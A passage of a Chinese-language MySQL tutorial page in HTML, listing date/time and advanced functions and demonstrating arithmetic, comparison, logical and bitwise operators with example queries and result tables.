TIME(&quot;19:30:10&quot;); -&gt; 19:30:10 </code></td></tr><tr><td align="left">TIME_FORMAT(t,f)</td><td align="left">按表达式 f 的要求显示时间 t</td><td align="left"><code>SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) 11:11:11 AM </code></td></tr><tr><td align="left">TIME_TO_SEC(t)</td><td align="left">将时间 t 转换为秒</td><td align="left"><code>SELECT TIME_TO_SEC(&#39;1:12:00&#39;) -&gt; 4320 </code></td></tr><tr><td align="left">TIMEDIFF(time1, time2)</td><td align="left">计算时间差值</td><td align="left"><code>mysql&gt; SELECT TIMEDIFF(&quot;13:10:11&quot;, &quot;13:10:10&quot;); -&gt; 00:00:01 mysql&gt; SELECT TIMEDIFF(&#39;2000:01:01 00:00:00&#39;,    -&gt;                 &#39;2000:01:01 00:00:00.000001&#39;);        -&gt; &#39;-00:00:00.000001&#39; mysql&gt; SELECT TIMEDIFF(&#39;2008-12-31 23:59:59.000001&#39;,    -&gt;                 &#39;2008-12-30 01:01:01.000002&#39;);        -&gt; &#39;46:58:57.999999&#39; </code></td></tr><tr><td align="left">TIMESTAMP(expression, interval)</td><td align="left">单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和</td><td align="left"><code>mysql&gt; SELECT TIMESTAMP(&quot;2017-07-23&quot;,  &quot;13:10:11&quot;); -&gt; 2017-07-23 13:10:11 mysql&gt; SELECT TIMESTAMP(&#39;2003-12-31&#39;);        -&gt; &#39;2003-12-31 00:00:00&#39; mysql&gt; SELECT TIMESTAMP(&#39;2003-12-31 12:00:00&#39;,&#39;12:00:00&#39;);        -&gt; &#39;2004-01-01 00:00:00&#39; </code></td></tr><tr><td align="left">TIMESTAMPDIFF(unit,datetime_expr1,datetime_expr2)</td><td align="left">计算时间差，返回 datetime_expr2 − datetime_expr1 的时间差</td><td align="left"><code>mysql&gt; SELECT TIMESTAMPDIFF(DAY,&#39;2003-02-01&#39;,&#39;2003-05-01&#39;);   // 计算两个时间相隔多少天        -&gt; 89 mysql&gt; SELECT TIMESTAMPDIFF(MONTH,&#39;2003-02-01&#39;,&#39;2003-05-01&#39;);   // 计算两个时间相隔多少月        -&gt; 3 mysql&gt; SELECT TIMESTAMPDIFF(YEAR,&#39;2002-05-01&#39;,&#39;2001-01-01&#39;);    // 计算两个时间相隔多少年        -&gt; -1 mysql&gt; SELECT TIMESTAMPDIFF(MINUTE,&#39;2003-02-01&#39;,&#39;2003-05-01 12:05:55&#39;);  // 计算两个时间相隔多少分钟        -&gt; 128885 </code></td></tr><tr><td align="left">TO_DAYS(d)</td><td align="left">计算日期 d 距离 0000 年 1 月 1 日的天数</td><td align="left"><code>SELECT TO_DAYS(&#39;0001-01-01 01:01:01&#39;) -&gt; 366 </code></td></tr><tr><td align="left">WEEK(d)</td><td align="left">计算日期 d 是本年的第几个星期，范围是 0 到 53</td><td align="left"><code>SELECT WEEK(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 </code></td></tr><tr><td align="left">WEEKDAY(d)</td><td align="left">日期 d 是星期几，0 表示星期一，1 表示星期二</td><td align="left"><code>SELECT WEEKDAY(&quot;2017-06-15&quot;); -&gt; 3 </code></td></tr><tr><td align="left">WEEKOFYEAR(d)</td><td align="left">计算日期 d 是本年的第几个星期，范围是 0 到 53</td><td align="left"><code>SELECT WEEKOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 </code></td></tr><tr><td align="left">YEAR(d)</td><td align="left">返回年份</td><td align="left"><code>SELECT YEAR(&quot;2017-06-15&quot;); -&gt; 2017 </code></td></tr><tr><td align="left">YEARWEEK(date, mode)</td><td align="left">返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推</td><td align="left"><code>SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724 </code></td></tr></tbody></table><hr><h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">BIN(x)</td><td align="left">返回 x 的二进制编码</td><td align="left">15 的 2 进制编码:<code>SELECT BIN(15); -- 1111 </code></td></tr><tr><td align="left">BINARY(s)</td><td align="left">将字符串 s 转换为二进制字符串</td><td align="left"><code>SELECT BINARY &quot;RUNOOB&quot;; -&gt; RUNOOB </code></td></tr><tr><td align="left"><code>CASE expression    WHEN condition1 THEN result1    WHEN condition2 THEN result2   ...    WHEN conditionN THEN resultN    ELSE result END</code></td><td align="left">CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。</td><td align="left"><code>SELECT CASE  　WHEN 1 &gt; 0 　THEN &#39;1 &gt; 0&#39; 　WHEN 2 &gt; 0 　THEN &#39;2 &gt; 0&#39; 　ELSE &#39;3 &gt; 0&#39; 　END -&gt;1 &gt; 0 </code></td></tr><tr><td align="left">CAST(x AS type)</td><td align="left">转换数据类型</td><td align="left">字符串日期转换为日期：<code>SELECT CAST(&quot;2017-08-29&quot; AS DATE); -&gt; 2017-08-29 </code></td></tr><tr><td align="left">COALESCE(expr1, expr2, …., expr_n)</td><td align="left">返回参数中的第一个非空表达式（从左向右）</td><td align="left"><code>SELECT COALESCE(NULL, NULL, NULL, &#39;runoob.com&#39;, NULL, &#39;google.com&#39;); -&gt; runoob.com </code></td></tr><tr><td align="left">CONNECTION_ID()</td><td align="left">返回唯一的连接 ID</td><td align="left"><code>SELECT CONNECTION_ID(); -&gt; 4292835 </code></td></tr><tr><td align="left">CONV(x,f1,f2)</td><td align="left">返回 f1 进制数变成 f2 进制数</td><td align="left"><code>SELECT CONV(15, 10, 2); -&gt; 1111 </code></td></tr><tr><td align="left">CONVERT(s USING cs)</td><td align="left">函数将字符串 s 的字符集变成 cs</td><td align="left"><code>SELECT CHARSET(&#39;ABC&#39;) -&gt;utf-8     SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) -&gt;gbk </code></td></tr><tr><td align="left">CURRENT_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT CURRENT_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">DATABASE()</td><td align="left">返回当前数据库名</td><td align="left"><code>SELECT DATABASE();    -&gt; runoob </code></td></tr><tr><td align="left">IF(expr,v1,v2)</td><td align="left">如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</td><td align="left"><code>SELECT IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;)     -&gt;正确 </code></td></tr><tr><td align="left"><a href="https://www.runoob.com/mysql/mysql-func-ifnull.html">IFNULL(v1,v2)</a></td><td align="left">如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。</td><td align="left"><code>SELECT IFNULL(null,&#39;Hello Word&#39;) -&gt;Hello Word </code></td></tr><tr><td align="left">ISNULL(expression)</td><td align="left">判断表达式是否为 NULL</td><td align="left"><code>SELECT ISNULL(NULL); -&gt;1 </code></td></tr><tr><td align="left">LAST_INSERT_ID()</td><td align="left">返回最近生成的 AUTO_INCREMENT 值</td><td align="left"><code>SELECT LAST_INSERT_ID(); -&gt;6 </code></td></tr><tr><td align="left">NULLIF(expr1, expr2)</td><td align="left">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</td><td align="left"><code>SELECT NULLIF(25, 25); -&gt; </code></td></tr><tr><td align="left">SESSION_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT SESSION_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">SYSTEM_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT SYSTEM_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT USER(); -&gt; guest@% </code></td></tr><tr><td align="left">VERSION()</td><td align="left">返回数据库的版本号</td><td align="left"><code>SELECT VERSION() -&gt; 5.6.34 </code></td></tr></tbody></table><h1 id="MySQL-运算符"><a href="#MySQL-运算符" class="headerlink" title="MySQL 运算符"></a>MySQL 运算符</h1><ul><li>算术运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符</li></ul><hr><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>MySQL 支持的算术运算符包括:</p><table><thead><tr><th align="left">运算符</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法</td></tr><tr><td align="left">-</td><td align="left">减法</td></tr><tr><td align="left">*</td><td align="left">乘法</td></tr><tr><td align="left">/ 或 DIV</td><td align="left">除法</td></tr><tr><td align="left">% 或 MOD</td><td align="left">取余</td></tr></tbody></table><p>在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。</p><p>1、加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1+2;</span><br><span class="line">+-----+</span><br><span class="line">| 1+2 |</span><br><span class="line">+-----+</span><br><span class="line">|   3 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>2、减</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1-2;</span><br><span class="line">+-----+</span><br><span class="line">| 1-2 |</span><br><span class="line">+-----+</span><br><span class="line">|  -1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>3、乘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2*3;</span><br><span class="line">+-----+</span><br><span class="line">| 2*3 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>4、除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2/3;</span><br><span class="line">+--------+</span><br><span class="line">| 2/3    |</span><br><span class="line">+--------+</span><br><span class="line">| 0.6667 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>5、商</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 10 DIV 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>6、取余</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 10 MOD 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 MOD 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><hr><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。</p><table><thead><tr><th align="left">符号</th><th align="left">描述</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等于</td><td align="left"></td></tr><tr><td align="left">&lt;&gt;, !=</td><td align="left">不等于</td><td align="left"></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left"></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left"></td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于</td><td align="left"></td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于</td><td align="left"></td></tr><tr><td align="left">BETWEEN</td><td align="left">在两值之间</td><td align="left">&gt;=min&amp;&amp;&lt;=max</td></tr><tr><td align="left">NOT BETWEEN</td><td align="left">不在两值之间</td><td align="left"></td></tr><tr><td align="left">IN</td><td align="left">在集合中</td><td align="left"></td></tr><tr><td align="left">NOT IN</td><td align="left">不在集合中</td><td align="left"></td></tr><tr><td align="left">&lt;=&gt;</td><td align="left">严格比较两个NULL值是否相等</td><td align="left">两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0</td></tr><tr><td align="left">LIKE</td><td align="left">模糊匹配</td><td align="left"></td></tr><tr><td align="left">REGEXP 或 RLIKE</td><td align="left">正则式匹配</td><td align="left"></td></tr><tr><td align="left">IS NULL</td><td align="left">为空</td><td align="left"></td></tr><tr><td align="left">IS NOT NULL</td><td align="left">不为空</td><td align="left"></td></tr></tbody></table><p>1、等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2=3;</span><br><span class="line">+-----+</span><br><span class="line">| 2=3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select NULL = NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| NULL = NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|        NULL |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>2、不等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;&gt;3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;&gt;3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>3、安全等于</p><p>与 <strong>=</strong> 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=&gt;3;</span><br><span class="line">+-------+</span><br><span class="line">| 2&lt;=&gt;3 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null=null;</span><br><span class="line">+-----------+</span><br><span class="line">| null=null |</span><br><span class="line">+-----------+</span><br><span class="line">|      NULL |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select null&lt;=&gt;null;</span><br><span class="line">+-------------+</span><br><span class="line">| null&lt;=&gt;null |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>4、小于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&lt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>5、小于等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>6、大于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&gt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&gt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>7、大于等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&gt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&gt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>8、BETWEEN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 between 1 and 10;</span><br><span class="line">+--------------------+</span><br><span class="line">| 5 between 1 and 10 |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>9、IN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 in (1,2,3,4,5);</span><br><span class="line">+------------------+</span><br><span class="line">| 5 in (1,2,3,4,5) |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>10、NOT IN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 not in (1,2,3,4,5);</span><br><span class="line">+----------------------+</span><br><span class="line">| 5 not in (1,2,3,4,5) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p>11、IS NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select null is NULL;</span><br><span class="line">+--------------+</span><br><span class="line">| null is NULL |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;a&#x27; is NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;a&#x27; is NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>12、IS NOT NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select null IS NOT NULL;</span><br><span class="line">+------------------+</span><br><span class="line">| null IS NOT NULL |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select &#x27;a&#x27; IS NOT NULL;</span><br><span class="line">+-----------------+</span><br><span class="line">| &#x27;a&#x27; IS NOT NULL |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>13、LIKE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;12345&#x27; like &#x27;12%&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &#x27;12345&#x27; like &#x27;12%&#x27; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;12345&#x27; like &#x27;12_&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &#x27;12345&#x27; like &#x27;12_&#x27; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>14、REGEXP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;jing&#x27;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| &#x27;beijing&#x27; REGEXP &#x27;jing&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;xi&#x27;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &#x27;beijing&#x27; REGEXP &#x27;xi&#x27; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">NOT 或 !</td><td align="left">逻辑非</td></tr><tr><td align="left">AND</td><td align="left">逻辑与</td></tr><tr><td align="left">OR</td><td align="left">逻辑或</td></tr><tr><td align="left">XOR</td><td align="left">逻辑异或</td></tr></tbody></table><p>1、与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2 and 0;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select 2 and 1;   </span><br><span class="line">+---------+     </span><br><span class="line">| 2 and 1 |      </span><br><span class="line">+---------+      </span><br><span class="line">|       1 |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>2、或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 or 1;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 0 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 || 0;</span><br><span class="line">+--------+</span><br><span class="line">| 1 || 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>3、非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select not 1;</span><br><span class="line">+-------+</span><br><span class="line">| not 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select !0;</span><br><span class="line">+----+</span><br><span class="line">| !0 |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure><p>4、异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 xor 1;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 0 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select null or 1;</span><br><span class="line">+-----------+</span><br><span class="line">| null or 1 |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><hr><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与</td></tr><tr><td align="left">|</td><td align="left">按位或</td></tr><tr><td align="left">^</td><td align="left">按位异或</td></tr><tr><td align="left">!</td><td 